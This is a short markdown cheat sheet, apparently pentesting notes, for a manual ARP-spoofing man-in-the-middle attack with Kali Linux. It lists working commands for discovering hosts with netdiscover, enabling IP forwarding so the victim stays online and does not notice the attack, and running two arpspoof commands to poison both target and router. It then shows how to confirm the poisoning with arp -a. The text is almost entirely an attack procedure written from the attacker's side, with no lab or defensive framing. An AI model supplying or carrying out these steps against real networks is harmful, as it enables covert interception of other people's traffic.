# Man in the Middle (Manual)

Manual ARP spoofing positions the attacker between a target and the router by lying to both about identity, forcing all traffic between them to pass through the attacker's machine first.

## Discovery

| Command | Description |
|---|---|
| `netdiscover -i eth0 -r [IP]0/24 -c 10` | Finds active devices on the network (IP + MAC) |

## Attack

| Command | Description |
|---|---|
| `echo 1 > /proc/sys/net/ipv4/ip_forward` | Enables Kali's IP forwarding; without this, the victim's internet is cut off and the MITM is noticed. With it enabled, Kali forwards incoming packets to the real destination (modem/router) — the victim stays connected while you see their traffic |
| `arpspoof -i eth0 -t [target IP] [router IP]` | Tells the target "I am the router" |
| `arpspoof -i eth0 -t [router IP] [target IP]` | Tells the router "I am the target" |

**Note:** These two `arpspoof` commands must be run in separate terminals, simultaneously, and kept running continuously — if stopped, the spoofing ends.

## Verification

| Command | Description |
|---|---|
| `arp -a` | Run on the victim's machine to check whether the attack is working — the router's MAC address should now show as the attacker's Kali MAC address, proving the spoofing succeeded |
